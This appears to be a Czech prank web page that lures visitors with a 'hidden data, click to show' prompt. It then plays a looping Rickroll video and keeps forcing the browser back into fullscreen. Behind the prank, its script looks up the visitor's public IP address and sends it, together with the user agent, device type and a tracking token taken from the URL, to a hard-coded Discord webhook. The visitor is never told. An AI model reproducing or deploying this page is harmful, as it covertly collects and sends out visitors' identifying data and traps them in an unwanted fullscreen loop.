<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <title>Skrytá data</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: black; display: flex; justify-content: center; align-items: center; cursor: pointer; color: #ff4444; font-family: 'Courier New', Courier, monospace; }
        video { width: 100%; height: 100%; object-fit: cover; display: none; }
        #warning { text-align: center; border: 2px solid #ff4444; padding: 20px; background: rgba(255,0,0,0.1); }
    </style>
</head>
<body>

    <div id="warning">
        <h2>Tyto data jsou skrytá.</h2>
        <p>Kliknutím je zobrazíte.</p>
        <p>[ ZOBRAZIT DATA ]</p>
    </div>

    <video id="rickroll" loop>
        <source src="https://github.com/ShatteredDisk/rickroll/raw/refs/heads/main/rickroll.mp4" type="video/mp4">
    </video>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1461819438948159601/1uQkuVDBbgrAtPCVvRnqDVjm1bGoOX12twRjQ9HALL4i4HEvyLbH4PuQlcMcs11_iE8P";
        const video = document.getElementById('rickroll');
        const warning = document.getElementById('warning');
        let isStarted = false;

        async function sendLog(token) {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const device = navigator.userAgent.includes("Mobi") ? "Mobil" : "PC/Tablet";

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "✅ Rickroll Successful (Persistent FS)",
                            color: 15548997,
                            fields: [
                                { name: "Uživatel (Token)", value: `\`${token}\``, inline: true },
                                { name: "Zařízení", value: `\`${device}\``, inline: true },
                                { name: "IP Adresa", value: `\`${ipData.ip}\``, inline: false },
                                { name: "User-Agent", value: `\`${navigator.userAgent}\`` }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) { console.error("Log failed"); }
        }

        function enterFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
        }

        // --- HLAVNÍ SMYČKA PRO FULLSCREEN ---
        function handlePersistentFullscreen() {
            if (isStarted && !document.fullscreenElement && !document.webkitFullscreenElement) {
                enterFullscreen();
            }
        }

        // Sledování změny fullscreenu
        document.addEventListener('fullscreenchange', handlePersistentFullscreen);
        document.addEventListener('webkitfullscreenchange', handlePersistentFullscreen);

        // Nucení fullscreenu i při kliknutí kamkoliv po startu
        document.addEventListener('click', () => {
            if (isStarted) enterFullscreen();
        });

        document.body.addEventListener('click', function() {
            if (!isStarted) {
                isStarted = true;
                const urlParams = new URLSearchParams(window.location.search);
                const token = urlParams.get('tkn') || "Neznámý";

                enterFullscreen();

                warning.style.display = 'none';
                video.style.display = 'block';
                video.play();

                sendLog(token);
            }
        });
    </script>
</body>
</html>
